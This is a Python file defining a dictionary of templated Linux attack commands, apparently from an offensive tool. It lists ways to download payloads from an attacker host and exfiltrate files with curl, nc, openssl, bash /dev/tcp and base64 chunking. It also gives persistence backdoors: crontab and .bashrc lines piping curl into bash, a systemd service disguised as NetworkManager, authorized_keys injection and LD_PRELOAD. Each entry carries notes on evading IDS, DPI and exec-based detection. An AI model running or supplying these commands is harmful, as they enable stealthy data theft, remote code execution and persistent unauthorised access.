# Linux GTFOBins command dictionary.

LINUX_COMMANDS = {

    # DOWNLOAD
    "download": [
        {
            "name":        "curl (silent download)",
            "binary":      "curl",
            "template":    "curl -s -o /tmp/{filename} http://{ip}:{port}/{filename}",
            "stealth_note": "curl is a ubiquitous system utility. "
                            "-s (silent) suppresses progress output, leaving no console noise.",
            "requires":    "curl installed (default on most distros).",
        },
        {
            "name":        "wget (background download)",
            "binary":      "wget",
            "template":    "wget -q -O /tmp/{filename} http://{ip}:{port}/{filename}",
            "stealth_note": "wget -q runs in quiet mode. Disguises as legitimate "
                            "package download traffic.",
            "requires":    "wget installed.",
        },
        {
            "name":        "python3 urllib download",
            "binary":      "python3",
            "template":    "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://{ip}:{port}/{filename}', '/tmp/{filename}')\"",
            "stealth_note": "Single-line Python avoids writing a .py script to disk. "
                            "Python3 is present on virtually every modern Linux system.",
            "requires":    "python3 available in PATH.",
        },
        {
            "name":        "bash /dev/tcp download",
            "binary":      "bash",
            "template":    "exec 3<>/dev/tcp/{ip}/{port}; echo -e 'GET /{filename} HTTP/1.0\\r\\nHost: {ip}\\r\\n' >&3; cat <&3 > /tmp/{filename}",
            "stealth_note": "Pure Bash built-in — no external binary creates network traffic. "
                            "Evades binary-execution detection entirely.",
            "requires":    "Bash with /dev/tcp support (enabled by default on most Linux).",
        },
        {
            "name":        "nc (netcat pull)",
            "binary":      "nc",
            "template":    "nc -w3 {ip} {port} < /dev/null | dd of=/tmp/{filename}",
            "stealth_note": "Netcat is a standard sysadmin tool. "
                            "Short-lived connection (-w3 timeout) leaves minimal log footprint.",
            "requires":    "Attacker must pipe file data upon connection (e.g. nc -lvp {port} < {filename}).",
        },
        {
            "name":        "openssl (encrypted download)",
            "binary":      "openssl",
            "template":    "openssl s_client -quiet -connect {ip}:{port} 2>/dev/null > /tmp/{filename}",
            "stealth_note": "Traffic is TLS-encrypted. DPI and IDS/IPS cannot inspect payload content.",
            "requires":    "Attacker must serve file over TLS (e.g. openssl s_server -cert ... -quiet).",
        },
        {
            "name":        "scp (SSH copy)",
            "binary":      "scp",
            "template":    "scp -P {port} root@{ip}:/{filename} /tmp/{filename}",
            "stealth_note": "SCP uses SSH (port 22 typically). "
                            "SSH traffic is encrypted and commonly allowed through firewalls.",
            "requires":    "SSH credentials or key on attacker machine; SSH server running on {port}.",
        },
    ],

    # UPLOAD / DATA EXFILTRATION
    "upload": [
        {
            "name":        "curl HTTP POST exfil",
            "binary":      "curl",
            "template":    "curl -s -X POST http://{ip}:{port}/upload -F 'file=@/tmp/{filename}'",
            "stealth_note": "HTTP POST blends with web application traffic. "
                            "-s suppresses output on the victim machine.",
            "requires":    "Attacker HTTP server must accept multipart file upload (e.g. uploadserver).",
        },
        {
            "name":        "nc (raw TCP exfil)",
            "binary":      "nc",
            "template":    "nc -w5 {ip} {port} < /tmp/{filename}",
            "stealth_note": "Raw TCP transfer — no HTTP headers, minimal log artifacts. "
                            "Short connection window (-w5) limits exposure.",
            "requires":    "Attacker listener: nc -lvnp {port} > received_{filename}",
        },
        {
            "name":        "openssl (encrypted exfil)",
            "binary":      "openssl",
            "template":    "openssl s_client -quiet -connect {ip}:{port} 2>/dev/null < /tmp/{filename}",
            "stealth_note": "TLS-encrypted raw socket. "
                            "IDS/IPS sees only encrypted bytes — payload is fully opaque.",
            "requires":    "Attacker listener: openssl s_server -quiet -accept {port} -cert cert.pem -key key.pem > received",
        },
        {
            "name":        "python3 base64 + HTTP POST",
            "binary":      "python3",
            "template":    "python3 -c \"import base64, urllib.request; data=open('/tmp/{filename}','rb').read(); urllib.request.urlopen(urllib.request.Request('http://{ip}:{port}/upload', data=base64.b64encode(data)))\"",
            "stealth_note": "File is Base64-encoded before transmission. "
                            "Naive content inspection won't recognise the original data.",
            "requires":    "Attacker HTTP endpoint must accept and decode Base64.",
        },
        {
            "name":        "scp (SSH exfil)",
            "binary":      "scp",
            "template":    "scp -P {port} /tmp/{filename} root@{ip}:/tmp/received_{filename}",
            "stealth_note": "SCP/SSH provides end-to-end encryption. "
                            "Traffic is indistinguishable from legitimate server administration.",
            "requires":    "SSH key/credentials and SSH daemon on attacker side.",
        },
        {
            "name":        "bash /dev/tcp exfil",
            "binary":      "bash",
            "template":    "cat /tmp/{filename} > /dev/tcp/{ip}/{port}",
            "stealth_note": "Pure Bash built-in — no binary spawned, evades exec-based detection. "
                            "Single raw TCP stream.",
            "requires":    "Attacker listener: nc -lvnp {port} > received_{filename}",
        },
        {
            "name":        "curl DNS exfil (base64 chunk)",
            "binary":      "curl",
            "template":    "for chunk in $(base64 /tmp/{filename} | fold -w 30); do curl -s \"http://$chunk.{ip}/\" > /dev/null; done",
            "stealth_note": "File data encoded into DNS-like subdomain queries. "
                            "Firewall typically allows port 80 outbound; data buried in Host header.",
            "requires":    "Attacker must run an HTTP server logging all Host headers.",
        },
    ],

    # PERSISTENCE
    "persistence": [
        {
            "name":        "crontab persistence",
            "binary":      "crontab",
            "template":    "(crontab -l 2>/dev/null; echo '@reboot curl -s http://{ip}:{port}/{filename} | bash') | crontab -",
            "stealth_note": "Appending to existing crontab avoids replacing legitimate cron jobs. "
                            "@reboot runs on every system restart.",
            "requires":    "curl available; cron daemon running.",
        },
        {
            "name":        "~/.bashrc persistence",
            "binary":      "bash",
            "template":    "echo 'curl -s http://{ip}:{port}/{filename} | bash &' >> ~/.bashrc",
            "stealth_note": "Payload appended to .bashrc is executed every interactive shell. "
                            "Runs in background (&) to avoid blocking the user.",
            "requires":    "Attacker serves payload at URL; target uses bash shell.",
        },
        {
            "name":        "systemd user service",
            "binary":      "systemctl",
            "template":    "mkdir -p ~/.config/systemd/user && echo -e '[Unit]\\nDescription=NetworkManager\\n[Service]\\nExecStart=/bin/bash -c \"curl -s http://{ip}:{port}/{filename} | bash\"\\nRestart=always\\n[Install]\\nWantedBy=default.target' > ~/.config/systemd/user/netmgr.service && systemctl --user enable netmgr.service && systemctl --user start netmgr.service",
            "stealth_note": "User-level systemd service named 'NetworkManager' blends with "
                            "legitimate system services. No root privileges required.",
            "requires":    "systemd with user session support (most modern distros).",
        },
        {
            "name":        "SSH authorised_keys backdoor",
            "binary":      "ssh",
            "template":    "curl -s http://{ip}:{port}/{filename} >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
            "stealth_note": "Injecting an SSH public key grants persistent passwordless access. "
                            "Looks like standard SSH key management.",
            "requires":    "Remote file must contain attacker's SSH public key; SSH daemon running.",
        },
        {
            "name":        "LD_PRELOAD persistence (.profile)",
            "binary":      "bash",
            "template":    "echo 'export LD_PRELOAD=/tmp/{filename}' >> ~/.profile",
            "stealth_note": "LD_PRELOAD forces a shared library to be loaded before all others, "
                            "allowing code injection into every dynamically-linked process.",
            "requires":    "Remote file must be a compiled .so shared library; dropped to /tmp first.",
        },
    ],
}
